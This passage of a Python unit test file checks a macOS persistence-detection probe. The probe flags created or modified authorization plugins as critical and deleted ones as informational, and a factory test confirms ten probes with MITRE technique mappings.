class TestAuthPluginProbe:
    """Tests for AuthPluginProbe."""

    def test_created(self):
        """New auth plugin => CRITICAL."""
        probe = AuthPluginProbe()
        entry = _entry(
            "ap1",
            "AUTH_PLUGIN",
            path="/Library/Security/SecurityAgentPlugins/evil.bundle",
            metadata={"name": "EvilPlugin", "bundle_id": "com.evil.auth"},
        )
        change = _change(
            "ap1", "AUTH_PLUGIN", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1
        assert events[0].severity == Severity.CRITICAL

    def test_modified(self):
        """Modified auth plugin => CRITICAL."""
        probe = AuthPluginProbe()
        entry = _entry(
            "ap2",
            "AUTH_PLUGIN",
            path="/Library/Security/test.bundle",
            metadata={"name": "Test"},
        )
        change = _change(
            "ap2", "AUTH_PLUGIN", PersistenceChangeType.MODIFIED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.CRITICAL

    def test_deleted(self):
        """Deleted auth plugin => INFO."""
        probe = AuthPluginProbe()
        entry = _entry("ap3", "AUTH_PLUGIN", path="/Library/Security/removed.bundle")
        change = _change(
            "ap3", "AUTH_PLUGIN", PersistenceChangeType.DELETED, old_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1
        assert events[0].severity == Severity.INFO
        assert events[0].event_type == "persistence_auth_plugin_deleted"

    def test_other_mechanism_ignored(self):
        """Non-AUTH_PLUGIN mechanism is ignored."""
        probe = AuthPluginProbe()
        entry = _entry("other", "LAUNCH_AGENT")
        change = _change(
            "other", "LAUNCH_AGENT", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 0


# =============================================================================
# Factory
# =============================================================================


class TestPersistenceFactory:
    """Test factory function."""

    def test_creates_ten_probes(self):
        probes = create_persistence_probes()
        assert len(probes) == 10

    def test_probe_names_unique(self):
        names = [p.name for p in create_persistence_probes()]
        assert len(names) == len(set(names))

    def test_all_probes_have_mitre(self):
        for probe in create_persistence_probes():
            assert len(probe.mitre_techniques) > 0, f"{probe.name} missing MITRE"
